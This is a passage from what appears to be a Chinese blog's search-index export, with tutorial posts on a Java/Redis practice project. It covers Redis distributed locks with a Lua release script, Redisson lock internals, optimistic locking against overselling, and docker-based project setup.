<h2 id="三-Redis分布式锁"><a href="#三-Redis分布式锁" class="headerlink" title="三 Redis分布式锁"></a>三 Redis分布式锁</h2><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216175750707.png" alt="image-20250216175750707"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216162347593.png" alt="image-20250216162347593"></p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216162523678.png" alt="image-20250216162523678" style="zoom:50%;" />

<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>使用Redis锁可能存在这样的安全问题，当线程1因某种原因线程阻塞时，可能会释放其他线程获取的锁。：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216172309261.png" alt="image-20250216172309261"></p>
<p>为了解决该问题，在释放锁时应该判断是否是自己的锁，如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216172442370.png" alt="image-20250216172442370"></p>
<p>这时仍然有可能出现问题，如下图，当线程1获取锁标识并判断一致后，还未释放锁时遇到阻塞（如jvm垃圾回收），导致后面又释放了其他线程的锁。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216173426178.png" alt="image-20250216173426178" style="zoom:80%;" />

<p>因此必须确保判断锁标识动作和释放锁动作的原子性。</p>
<h3 id="Redis的Lua脚本"><a href="#Redis的Lua脚本" class="headerlink" title="Redis的Lua脚本"></a>Redis的Lua脚本</h3><p>Redis提供了Lua脚本功能，在一个脚本中编写多条Redis命令，确保多条命令执行时的原子性。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 获取锁中的线程标识 get key</span></span><br><span class="line"><span class="keyword">local</span> id = redis.call(<span class="string">&#x27;get&#x27;</span>, KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="comment">-- 比较线程标识与锁中的标识是否一致</span></span><br><span class="line"><span class="keyword">if</span> (id == ARGV[<span class="number">1</span>]) <span class="keyword">then</span></span><br><span class="line">    <span class="comment">-- 一致则释放锁 del key</span></span><br><span class="line">    <span class="keyword">return</span> redis.call(<span class="string">&#x27;del&#x27;</span>, KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="四-Redisson"><a href="#四-Redisson" class="headerlink" title="四 Redisson"></a>四 Redisson</h2><h3 id="Redisson分布式锁"><a href="#Redisson分布式锁" class="headerlink" title="Redisson分布式锁"></a>Redisson分布式锁</h3><p>基于Redis实现的分布式锁有以下问题：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216180139034.png" alt="image-20250216180139034"></p>
<p>因此使用Redisson来优化。Redisson是一个在Redis的基础上实现的Java驻内存数据网格（In-Memory Data Grid）。它不仅提供了一系列的分布式的Java常用对象，还提供了许多分布式服务，其中就包含了各种分布式锁的实现。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216180429234.png" alt="image-20250216180429234"></p>
<h3 id="Redisson分布式锁原理"><a href="#Redisson分布式锁原理" class="headerlink" title="Redisson分布式锁原理"></a>Redisson分布式锁原理</h3><h4 id="可重入"><a href="#可重入" class="headerlink" title="可重入"></a>可重入</h4><p>可重入锁：同一个线程多次请求锁，可能会造成死锁。因此需要允许可重入锁。</p>
<p>利用redis中的hash数据结构，为锁额外记录一个值，代表该锁的重入次数。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216193242076.png" alt="image-20250216193242076"></p>
<p>同一个线程每重入一次锁，将值+1，释放锁改为将值-1，值为0时才真正释放锁。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216193339921.png" alt="image-20250216193339921" style="zoom: 80%;" />

<p>为保证原子性，同样要使用Lua脚本。</p>
<h4 id="重试机制"><a href="#重试机制" class="headerlink" title="重试机制"></a>重试机制</h4><p>redisson可以设置等待时间waitTime，在获取锁失败后，会订阅并等待释放锁的信号，然后进行重试，直到获取锁成功或waitTime消耗完。</p>
<h4 id="超时续约"><a href="#超时续约" class="headerlink" title="超时续约"></a>超时续约</h4><p>redisson中的watchdog在获取锁时设置了一个定时任务，每隔一段时间刷新锁的有效期（releaseTime&#x2F;3），直到释放锁时取消定时任务。注意，如果设置了leaseTime就没有watchdog了。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216231353719.png" alt="image-20250216231353719"></p>
<h4 id="主从一致性问题"><a href="#主从一致性问题" class="headerlink" title="主从一致性问题"></a>主从一致性问题</h4><p>问题产生原因：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216231742145.png" alt="image-20250216231742145" style="zoom:67%;" />

<p>redisson解决方案：<strong>MultiLock</strong></p>
<p>将每一个redis节点都视为主节点，只有向每个节点获取锁成功，才算成功。此时如果一个redis节点宕机，并不影响锁的正常获取和释放。此外也可以给每个节点建立主从关系，此时如果一个主节点宕机且刚好没有完成同步，由于从节点没有锁的标识，其他线程也无法成功获取锁，满足要求。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216231841738.png" alt="image-20250216231841738" style="zoom:67%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216232050725.png" alt="image-20250216232050725" style="zoom: 50%;" />

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216233314954.png" alt="image-20250216233314954"></p>
]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马点评项目实战（四）——商品超卖问题</title>
    <url>/2024/02/16/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E5%95%86%E5%93%81%E8%B6%85%E5%8D%96%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="一-超卖问题"><a href="#一-超卖问题" class="headerlink" title="一 超卖问题"></a>一 超卖问题</h2><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216144807538.png" alt="image-20250216144807538" style="zoom: 67%;" />

<span id="more"></span>

<h2 id="二-悲观锁与乐观锁"><a href="#二-悲观锁与乐观锁" class="headerlink" title="二 悲观锁与乐观锁"></a>二 悲观锁与乐观锁</h2><p><strong>悲观锁</strong>：</p>
<ul>
<li>认为线程安全问题一定会发生，因此在操作数据之前先获取锁，确保线程串行执行。</li>
<li>例如Synchronized、Lock都属于悲观锁。</li>
</ul>
<p><strong>乐观锁</strong>：</p>
<ul>
<li>认为线程安全问题不一定会发生，因此不加锁，只是在更新数据时去判断有没有其他线程对数据做了修改。</li>
<li>如果没有修改则认为是安全的，自己才更新数据。</li>
<li>如果已经被其他线程修改说明发生了安全问题，此时可以重试或异常。</li>
</ul>
<h2 id="三-乐观锁"><a href="#三-乐观锁" class="headerlink" title="三 乐观锁"></a>三 乐观锁</h2><p>乐观锁的关键是判断之前查询得到的数据是否有被修改过。</p>
<p>但是存在成功率低的问题。</p>
<h3 id="版本号法"><a href="#版本号法" class="headerlink" title="版本号法"></a>版本号法</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216145309648.png" alt="image-20250216145309648" style="zoom:50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216145323789.png" alt="image-20250216145323789" style="zoom: 50%;" />

<h3 id="CAS法（Compare-and-Set）"><a href="#CAS法（Compare-and-Set）" class="headerlink" title="CAS法（Compare and Set）"></a>CAS法（Compare and Set）</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250216145514582.png" alt="image-20250216145514582" style="zoom: 80%;" />
]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马点评项目实战（零）——开始</title>
    <url>/2024/01/15/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E9%9B%B6%EF%BC%89%E2%80%94%E2%80%94%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/36ae63ab645a9c72eb8a18089e2a56d3.png" alt="36ae63ab645a9c72eb8a18089e2a56d3"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250115155645572.png" alt="image-20250115155645572"></p>
<span id="more"></span>

<h2 id="导入项目"><a href="#导入项目" class="headerlink" title="导入项目"></a>导入项目</h2><p>输入以下命令clone项目：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cs001020/hmdp.git</span><br></pre></td></tr></table></figure>

<p>默认在master分支，切换到init分支。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git checkout init</span><br></pre></td></tr></table></figure>

<h3 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h3><p>修改配置文件<code>application.yaml</code>，更改mysql和redis的地址、用户名、密码等配置。</p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>在mysql数据库中创建一个新的database，名为<code>hmdp</code>。</p>
<p>然后执行项目中的<code>hmdp.sql</code>脚本，创建所需表和原始数据。</p>
<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>部署redis有三种方式，一种是下载windows redis（但redis是默认基于linux开发的），一种是在虚拟机上部署redis，还有一种是服务器上。我选择了在服务器上部署，并使用docker。</p>
<p>首先拉取镜像：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull redis:<span class="number">7</span>.<span class="number">0</span>.<span class="number">12</span> </span><br></pre></td></tr></table></figure>

<p>然后创建一个<code>redis.conf</code>配置文件，内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Redis 端口号</span></span><br><span class="line"><span class="string">port</span> <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听所有 IP 地址</span></span><br><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置密码</span></span><br><span class="line"><span class="string">requirepass</span> <span class="string">xxxxxx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最大内存限制为 256MB</span></span><br><span class="line"><span class="string">maxmemory</span> <span class="string">256mb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据持久化配置</span></span><br><span class="line"><span class="comment"># 开启 AOF 持久化</span></span><br><span class="line"><span class="string">appendonly</span> <span class="literal">yes</span></span><br></pre></td></tr></table></figure>

<p>最后运行容器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d --name hmdp-redis -p 6379:6379 -v ~/redis/data:/data -v ~/redis/redis.conf:/etc/redis/redis.conf redis:7.0.12 redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>

<p>不要忘了到安全组中打开6379端口。</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>前端是已经配置好的，直接输入以下命令启动：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="literal">start</span> nginx.exe</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
        <tag>springboot</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
</search>
